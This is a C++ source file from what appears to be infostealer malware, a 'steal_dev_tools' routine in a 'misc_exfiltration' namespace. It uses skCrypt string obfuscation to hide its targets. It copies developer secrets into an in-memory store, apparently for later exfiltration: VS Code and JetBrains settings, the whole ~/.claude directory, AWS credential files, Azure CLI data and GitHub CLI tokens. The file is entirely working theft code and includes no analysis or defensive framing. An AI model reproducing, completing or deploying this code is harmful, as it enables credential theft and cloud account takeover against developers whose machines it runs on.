#include <misc_stealing/dev_tools.hpp>
#include <filesystem>
#include <string>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

void steal_dev_tools() {
    std::string home    = features::get_home();
    std::string roaming = home + skCrypt("\\AppData\\Roaming\\");

    //vscode
    {
        fs::path vscode_user = fs::path(roaming) / skCrypt("Code") / skCrypt("User");
        if (fs::exists(vscode_user)) {
            {
                fs::path src = vscode_user / skCrypt("settings.json");
                if (fs::exists(src))
                    mem_store::import_file(skCrypt("dev_tools/vscode/settings.json"), src);
            }
            {
                fs::path src = vscode_user / skCrypt("keybindings.json");
                if (fs::exists(src))
                    mem_store::import_file(skCrypt("dev_tools/vscode/keybindings.json"), src);
            }
            mem_store::import_tree(skCrypt("dev_tools/vscode/globalStorage"),
                vscode_user / skCrypt("globalStorage"), 512 * 1024);
        }
    }

    //jetbrains
    {
        fs::path jb_root = fs::path(roaming) / skCrypt("JetBrains");
        if (fs::exists(jb_root)) {
            try {
                for (const auto& ide : fs::directory_iterator(jb_root)) {
                    if (!ide.is_directory()) continue;
                    fs::path options = ide.path() / skCrypt("options");
                    if (!fs::exists(options)) continue;
                    std::string ide_name = ide.path().filename().string();
                    for (const auto& entry : fs::directory_iterator(options)) {
                        if (entry.is_regular_file() && entry.path().extension() == skCrypt(".xml"))
                            mem_store::import_file(
                                skCrypt("dev_tools/jetbrains/") + ide_name + "/" + entry.path().filename().string(),
                                entry.path());
                    }
                }
            } catch (const std::exception&) {}
        }
    }

    //claude code
    {
        fs::path claude_dir = fs::path(home) / skCrypt(".claude");
        if (fs::exists(claude_dir)) {
            try {
                for (const auto& e : fs::directory_iterator(claude_dir)) {
                    if (e.is_regular_file())
                        mem_store::import_file(
                            skCrypt("dev_tools/claude_code/") + e.path().filename().string(),
                            e.path());
                }
            } catch (const std::exception&) {}
        }
    }

    //aws credentials
    {
        fs::path aws = fs::path(home) / skCrypt(".aws");
        {
            fs::path src = aws / skCrypt("credentials");
            if (fs::exists(src)) mem_store::import_file(skCrypt("dev_tools/aws/credentials"), src);
        }
        {
            fs::path src = aws / skCrypt("config");
            if (fs::exists(src)) mem_store::import_file(skCrypt("dev_tools/aws/config"), src);
        }
    }

    //azure cli
    {
        fs::path azure = fs::path(home) / skCrypt(".azure");
        if (fs::exists(azure))
            mem_store::import_tree(skCrypt("dev_tools/azure"), azure, 256 * 1024);
    }

    //git config
    {
        fs::path gitcfg = fs::path(home) / skCrypt(".gitconfig");
        if (fs::exists(gitcfg))
            mem_store::import_file(skCrypt("dev_tools/gitconfig"), gitcfg);
    }

    //github cli credentials
    {
        fs::path gh_dir = fs::path(roaming) / skCrypt("GitHub CLI");
        if (!fs::exists(gh_dir))
            gh_dir = fs::path(home) / skCrypt(".config") / skCrypt("gh");
        if (fs::exists(gh_dir))
            mem_store::import_tree(skCrypt("dev_tools/github_cli"), gh_dir, 64 * 1024);
    }
}

}
